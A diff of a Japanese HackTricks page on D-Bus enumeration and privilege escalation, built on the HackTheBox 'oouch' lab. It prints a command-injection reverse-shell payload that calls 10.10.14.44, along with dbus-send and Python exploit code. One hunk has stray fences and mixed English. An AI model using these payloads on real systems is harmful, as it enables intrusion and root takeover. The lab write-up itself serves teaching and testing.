@@ -2,25 +2,25 @@
 
 <details>
 
-<summary><strong>**htARTE（HackTricks AWS Red Team Expert）**でAWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>こちら</strong></a><strong>！</strong></summary>
+<summary><strong>**htARTE（HackTricks AWS Red Team Expert）**でAWSハッキングをゼロからヒーローまで学ぶ</strong></summary>
 
 HackTricksをサポートする他の方法：
 
 - **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
 - [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
-- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見る
-- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)をフォローする
-- **ハッキングトリックを共有するには、[HackTricks](https://github.com/carlospolop/hacktricks)と[HackTricks Cloud](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください**
+- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
+- 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)をフォローする
+- **ハッキングトリックを共有するために、**[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出する
 
 </details>
 
 ## **GUI列挙**
 
-Ubuntuデスクトップ環境では、D-Busがプロセス間通信（IPC）の仲介者として使用されています。Ubuntuでは、複数のメッセージバスが同時に動作しており、特権のあるサービスがシステム全体で関連するサービスを公開するために主に使用されるシステムバスと、ログインしている各ユーザーごとに公開されるその特定のユーザーに関連するサービスを公開するセッションバスが観察されます。ここでは、特権昇格を目的としているため、特にシステムバスに焦点を当てています。D-Busのアーキテクチャでは、セッションバスごとに「ルーター」が使用され、クライアントメッセージをクライアントが通信したいサービスに基づいて適切なサービスにリダイレクトする責任があります。
+Ubuntuデスクトップ環境では、D-Busがプロセス間通信（IPC）の仲介者として使用されています。Ubuntuでは、複数のメッセージバスが同時に動作しており、システムバスは**特権のあるサービスがシステム全体で利用するサービスを公開するために主に使用**され、ログインしているユーザーごとにセッションバスがあり、その特定のユーザーにのみ関連するサービスを公開します。ここでは、特権昇格を目的としているため、特権の高い権限（たとえば、root）で実行されているサービスに関連するシステムバスに焦点を当てています。D-Busのアーキテクチャでは、セッションバスごとに「ルーター」が使用され、クライアントメッセージをクライアントが通信したいサービスに基づいて適切なサービスにリダイレクトする責任があります。
 
-D-Bus上のサービスは、それらが公開する**オブジェクト**と**インターフェース**によって定義されます。オブジェクトは、標準のOOP言語のクラスインスタンスに似ており、各インスタンスは**オブジェクトパス**によって一意に識別されます。研究目的の主要なインターフェースは、**org.freedesktop.DBus.Introspectable**インターフェースで、単一のメソッドであるIntrospectを備えています。このメソッドは、オブジェクトがサポートするメソッド、シグナル、およびプロパティのXML表現を返しますが、ここではプロパティとシグナルを省略してメソッドに焦点を当てています。
+D-Bus上のサービスは、それらが公開する**オブジェクト**と**インターフェース**によって定義されます。オブジェクトは、標準のOOP言語のクラスインスタンスに似ており、各インスタンスは**オブジェクトパス**によって一意に識別されます。このパスは、ファイルシステムパスに似ており、サービスによって公開される各オブジェクトを一意に識別します。研究目的の主要なインターフェースは、**org.freedesktop.DBus.Introspectable**インターフェースで、単一のメソッドであるIntrospectを備えています。このメソッドは、オブジェクトがサポートするメソッド、シグナル、およびプロパティのXML表現を返しますが、ここではプロパティとシグナルを省略してメソッドに焦点を当てています。
 
-D-Busインターフェースとの通信には、2つのツールが使用されました：スクリプトでD-Busに公開されたメソッドを簡単に呼び出すためのCLIツールである**gdbus**と、各バスで利用可能なサービスを列挙し、各サービスに含まれるオブジェクトを表示するために設計されたPythonベースのGUIツールである[**D-Feet**](https://wiki.gnome.org/Apps/DFeet)。
+D-Busインターフェースとの通信には、2つのツールが使用されました：**gdbus**というCLIツールは、スクリプトでD-Busによって公開されたメソッドを簡単に呼び出すために使用され、[**D-Feet**](https://wiki.gnome.org/Apps/DFeet)は、各バスで利用可能なサービスを列挙し、各サービスに含まれるオブジェクトを表示するためのPythonベースのGUIツールです。
 ```bash
 sudo apt-get install d-feet
 ```
@@ -29,21 +29,21 @@ sudo apt-get install d-feet
 ![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)
 
 
-最初の画像では、D-Busシステムバスに登録されたサービスが表示され、**org.debin.apt**がSystem Busボタンを選択した後に特に強調されています。D-Feetはこのサービスに対してオブジェクトをクエリし、選択したオブジェクトのインターフェース、メソッド、プロパティ、およびシグナルを表示します。これは2番目の画像で見られます。各メソッドのシグネチャも詳細に表示されます。
+最初の画像では、D-Busシステムバスに登録されたサービスが表示され、**System Bus**ボタンを選択した後に特に**org.debin.apt**が強調表示されています。D-Feetはこのサービスに対してオブジェクトをクエリし、選択したオブジェクトのインターフェース、メソッド、プロパティ、およびシグナルを表示します。これは第二の画像で見られます。各メソッドのシグネチャも詳細に表示されます。
 
-注目すべき特徴として、サービスの**プロセスID（pid）**と**コマンドライン**が表示され、サービスが昇格された権限で実行されているかどうかを確認するのに役立ち、研究の関連性に重要です。
+注目すべき特徴は、サービスの**プロセスID（pid）**と**コマンドライン**の表示です。これは、サービスが昇格された権限で実行されているかどうかを確認するのに役立ち、研究の関連性に重要です。
 
-**D-Feetはまたメソッドの呼び出しを許可**します：ユーザーはPython式をパラメーターとして入力でき、D-FeetはこれをD-Busタイプに変換してからサービスに渡します。
+**D-Feetはまたメソッドの呼び出しを許可します**：ユーザーはPython式をパラメーターとして入力でき、D-FeetはこれをD-Busタイプに変換してからサービスに渡します。
 
-ただし、**一部のメソッドは認証が必要**で、これらを呼び出す前に認証が必要です。私たちの目標は、まず資格情報なしで特権を昇格させることなので、これらのメソッドは無視します。
+ただし、**一部のメソッドは認証が必要**で、それらを呼び出す前に認証する必要があります。私たちの目標は、まずは資格情報なしで特権を昇格させることなので、これらのメソッドは無視します。
 
-また、一部のサービスが、特定のアクションを実行することが許可されるべきかどうかをユーザーに尋ねる別のD-Busサービスであるorg.freedeskto.PolicyKit1をクエリすることに注意してください。
+また、一部のサービスは、特定のアクションを実行することが許可されるべきかどうかをユーザーに尋ねる別のD-Busサービスである**org.freedeskto.PolicyKit1**をクエリします。
 
 ## **Cmd line列挙**
 
 ### サービスオブジェクトのリスト
 
-D-Busインターフェースを開いたリストを次のようにしてリストアップすることができます：
+次のように開かれたD-Busインターフェースをリストアップすることが可能です：
 ```bash
 busctl list #List D-Bus interfaces
 
@@ -133,7 +133,7 @@ cap_mknod cap_lease cap_audit_write cap_audit_control
 cap_setfcap cap_mac_override cap_mac_admin cap_syslog
 cap_wake_alarm cap_block_suspend cap_audit_read
 ```
-### サービスオブジェクトのインターフェースをリストアップします
+### サービスオブジェクトのインターフェースをリストアップする
 
 十分な権限が必要です。
 ```bash
@@ -165,21 +165,21 @@ org.freedesktop.DBus.Properties     interface -         -            -
 ```
 ### モニター/キャプチャーインターフェース
 
-十分な権限があれば（`send_destination` と `receive_sender` 権限だけでは不十分）、**D-Bus通信を監視**することができます。
+十分な権限があれば（`send_destination`と`receive_sender`権限だけでは不十分）、**D-Bus通信をモニター**することができます。
 
-**通信を監視**するには、**root**である必要があります。まだrootであることに問題がある場合は、[https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) と [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus) を確認してください。
+**通信をモニター**するには**root権限**が必要です。rootであるにもかかわらず問題が発生する場合は、[https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) と [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus) を確認してください。
 
 {% hint style="warning" %}
-D-Bus構成ファイルを設定して**非rootユーザーが通信をスニッフィング**できるようにする方法をご存知の場合は、**お知らせください**！
+D-Bus構成ファイルを構成して**非rootユーザーが通信をスニッフィング**できるようにする方法をご存知の場合は、**お知らせください**！
 {% endhint %}
 
-監視するための異なる方法：
+モニターするための異なる方法：
 ```bash
 sudo busctl monitor htb.oouch.Block #Monitor only specified
 sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
 sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
 ```
-以下の例では、インターフェース`htb.oouch.Block`が監視され、**"**_**lalalalal**_**"というメッセージが誤った通信経由で送信されます**:
+以下の例では、インターフェース `htb.oouch.Block` が監視され、**"**_**lalalalal**_**"** というメッセージが誤った通信経由で送信されます。
 ```bash
 busctl monitor htb.oouch.Block
 
@@ -204,7 +204,7 @@ STRING "Carried out :D";
 ```bash
 dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
 ```
-複数のルールを指定できます。メッセージがいずれかのルールに一致する場合、そのメッセージが表示されます。以下のように:
+複数のルールを指定できます。メッセージがルールのいずれかに一致すると、そのメッセージが表示されます。次のように:
 ```bash
 dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
 ```
@@ -212,7 +212,7 @@ dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
 ```bash
 dbus-monitor "type=method_call" "type=method_return" "type=error"
 ```
-参考: [D-Busのドキュメント](http://dbus.freedesktop.org/doc/dbus-specification.html) で、マッチルールの構文に関する詳細情報を確認してください。
+参考: [D-Busドキュメント](http://dbus.freedesktop.org/doc/dbus-specification.html) でマッチルール構文に関する詳細情報を確認してください。
 
 ### その他
 
@@ -220,7 +220,7 @@ dbus-monitor "type=method_call" "type=method_return" "type=error"
 
 ## **脆弱性シナリオ**
 
-HTBのホスト"oouch"内のユーザー**qtc**として、_/etc/dbus-1/system.d/htb.oouch.Block.conf_ にある**予期しないD-Bus構成ファイル**を見つけることができます。
+ユーザー **HTBのホスト"oouch"内のqtc** として、_**/etc/dbus-1/system.d/htb.oouch.Block.conf**_ にある **予期しないD-Bus構成ファイル** を見つけることができます。
 ```xml
 <?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->
 
@@ -243,7 +243,7 @@ HTBのホスト"oouch"内のユーザー**qtc**として、_/etc/dbus-1/system.d
 ```
 前の設定から、このD-BUS通信を介して情報を送受信するには、ユーザー`root`または`www-data`である必要があることに注意してください。
 
-Dockerコンテナ**aeb4525789d8**内のユーザー**qtc**として、ファイル_/code/oouch/routes.py_でいくつかのD-BUS関連コードを見つけることができます。興味深いコードは次のとおりです：
+Dockerコンテナ**aeb4525789d8**内のユーザー**qtc**として、ファイル_/code/oouch/routes.py_にいくつかのdbus関連コードが見つかります。興味深いコードは次のとおりです：
 ```python
 if primitive_xss.search(form.textfield.data):
 bus = dbus.SystemBus()
@@ -255,14 +255,16 @@ response = block_iface.Block(client_ip)
 bus.close()
 return render_template('hacker.html', title='Hacker')
 ```
-如何見て取れるように、**D-Busインターフェースに接続** し、"Block" 関数に "client\_ip" を送信しています。
+```markdown
+As you can see, it is **D-Busインターフェースに接続** し、"Block" 関数に "client_ip" を送信しています。
 
-D-Bus接続のもう一方には、実行中のいくつかのCコンパイルされたバイナリがあります。このコードは、D-Bus接続でIPアドレスを**リッスン**し、`system` 関数を介してiptablesを呼び出して、指定されたIPアドレスをブロックしています。\
-**`system`への呼び出しは、意図的にコマンドインジェクションの脆弱性があります**、したがって、次のようなペイロードがリバースシェルを作成します: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`
+D-Bus接続のもう一方には、いくつかのCコンパイルされたバイナリが実行されています。このコードは、D-Bus接続でIPアドレスを受信し、`system` 関数を介してiptablesを呼び出して指定されたIPアドレスをブロックしています。\
+`system` への呼び出しは、意図的にコマンドインジェクションの脆弱性があります。そのため、次のようなペイロードを使用すると、リバースシェルが作成されます: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`
 
 ### 悪用方法
 
-このページの最後には、D-Busアプリケーションの**完全なCコード**があります。その中には、**`D-Busオブジェクトパス`** と **`インターフェース名`** が **登録** されている91-97行の間に見つけることができます。この情報は、D-Bus接続に情報を送信するために必要になります：
+このページの最後に、**D-Busアプリケーションの完全なCコード**があります。その中には、**`D-Busオブジェクトパス`** と **`インターフェース名`** が **登録** されている91-97行の間に見つけることができます。この情報は、D-Bus接続に情報を送信するために必要になります：
+```
 ```c
 /* Install the object */
 r = sd_bus_add_object_vtable(bus,
@@ -272,13 +274,13 @@ r = sd_bus_add_object_vtable(bus,
 block_vtable,
 NULL);
 ```
-また、57行目では、このD-Bus通信に登録されている**唯一のメソッド**が`Block`と呼ばれていることがわかります（_**そのため、次のセクションではペイロードがサービスオブジェクト`htb.oouch.Block`、インターフェース`/htb/oouch/Block`、およびメソッド名`Block`に送信されることになります**_）:
+また、57行目では、このD-Bus通信に登録されている**唯一のメソッド**が`Block`と呼ばれていることがわかります（_**そのため、次のセクションではペイロードが`htb.oouch.Block`サービスオブジェクト、`/htb/oouch/Block`インターフェース、および`Block`メソッド名に送信される**_）:
 ```c
 SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
 ```
 #### Python
 
-以下のPythonコードは、`block_iface.Block(runme)`を介して`Block`メソッドにペイロードをD-Bus接続に送信します（_前のコードチャンクから抽出されたものであることに注意してください_）:
+以下のPythonコードは、`block_iface.Block(runme)`を介して`Block`メソッドにペイロードをD-Bus接続に送信します（_前のコードチャンクから抽出されたことに注意してください_）:
 ```python
 import dbus
 bus = dbus.SystemBus()
@@ -293,13 +295,13 @@ bus.close()
 dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
 ```
 * `dbus-send`は「メッセージバス」にメッセージを送信するためのツールです。
-* メッセージバス - システム間の通信を容易にするためにシステムが使用するソフトウェアです。メッセージキューに関連しており、メッセージは順序付けられますが、メッセージバスではメッセージが購読モデルで送信され、非常に迅速です。
+* メッセージバス - システム間の通信を容易にするためにシステムが使用するソフトウェアです。メッセージキューに関連しています（メッセージは順番に並んでいます）が、メッセージバスではメッセージが購読モデルで送信され、非常に迅速です。
 * "-system"タグは、デフォルトではなくシステムメッセージであることを示すために使用されます。
-* "--print-reply"タグは、メッセージを適切に出力し、人間が読める形式で返信を受け取るために使用されます。
+* "--print-reply"タグは、メッセージを適切に出力し、人間が読める形式で返信を受け取ります。
 * "--dest=Dbus-Interface-Block" - Dbusインターフェースのアドレスです。
-* "--string:" - インターフェースに送信したいメッセージのタイプです。ダブル、バイト、ブール値、整数、オブジェクトパスなど、いくつかの形式でメッセージを送信する方法があります。このうち、「オブジェクトパス」は、ファイルのパスをDbusインターフェースに送信したい場合に便利です。この場合、特別なファイル（FIFO）を使用して、ファイル名でインターフェースにコマンドを渡すことができます。"string:;" - これは、再びオブジェクトパスを呼び出すためのもので、FIFOリバースシェルファイル/コマンドの場所を置く場所です。
+* "--string:" - インターフェースに送信したいメッセージのタイプです。ダブル、バイト、ブール値、整数、オブジェクトパスなど、メッセージを送信するためのいくつかのフォーマットがあります。この中で、「オブジェクトパス」は、ファイルのパスをDbusインターフェースに送信したい場合に便利です。この場合、特別なファイル（FIFO）を使用して、ファイルの名前でインターフェースにコマンドを渡すことができます。"string:;" - これは、再びオブジェクトパスを呼び出すためのもので、FIFOリバースシェルファイル/コマンドの場所を置く場所です。
 
-_htb.oouch.Block.Block_では、最初の部分（_htb.oouch.Block_）がサービスオブジェクトを参照し、最後の部分（_.Block_）がメソッド名を参照しています。
+_`htb.oouch.Block.Block`では、最初の部分（`htb.oouch.Block`）がサービスオブジェクトを参照し、最後の部分（`.Block`）がメソッド名を参照しています。_
 
 ### Cコード
 
@@ -446,7 +448,7 @@ return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
 ```
 {% endcode %}
 
-# 参考文献
+## 参考文献
 * [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
 
 <details>
@@ -455,10 +457,10 @@ return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
 
 HackTricks をサポートする他の方法:
 
-* **HackTricks で企業を宣伝したい**または **HackTricks をPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を手に入れる
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
-* 💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f)または [**telegram グループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)を**フォロー**する。
-* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリに PR を提出して、あなたのハッキングトリックを共有してください。
+* **HackTricks で企業を宣伝したい**または **HackTricks をPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
+* [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手する
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションを見つける
+* 💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f) に参加するか、[**telegram グループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live) をフォローする
+* **HackTricks** と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks) の github リポジトリに PR を提出して、あなたのハッキングトリックを共有する
 
 </details>
